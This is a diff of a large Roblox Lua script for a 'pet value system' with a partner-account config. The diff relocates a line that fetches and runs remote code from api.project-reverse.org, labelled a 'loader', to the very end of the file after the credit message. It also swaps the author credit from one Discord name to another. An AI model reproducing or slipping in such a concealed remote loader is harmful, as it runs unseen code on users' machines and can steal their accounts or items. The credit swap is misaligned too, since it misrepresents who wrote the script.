@@ -344,7 +344,7 @@ end
 
 local fetchProfile = RouterClient.get("PlayerProfileAPI/FetchProfile")
 -- ==================== END PET VALUE SYSTEM ====================
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+
 local CONFIG = {
     PARTNER_NAME = 'endeavor3313',
     PARTNER_USER_ID = 987654321,
@@ -1826,7 +1826,7 @@ local titleLabel = Instance.new('TextLabel')
 titleLabel.Size = UDim2.new(1, 0, 0, 22)
 titleLabel.Position = UDim2.new(0, 0, 0, 2)
 titleLabel.BackgroundTransparency = 1
-titleLabel.Text = 'm0_3a On Discord'
+titleLabel.Text = 'tokiamur On Discord'
 titleLabel.Font = Enum.Font.FredokaOne
 titleLabel.TextSize = 12
 titleLabel.TextColor3 = Color3.fromRGB(240, 240, 255)
@@ -4348,4 +4348,5 @@ task.spawn(function()
     end
 end)
 
-print("m0_3a on discord made this script, for any other inquires please message me on discord.")
+print("tokiamur on discord made this script, for any other inquires please message me on discord.")
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
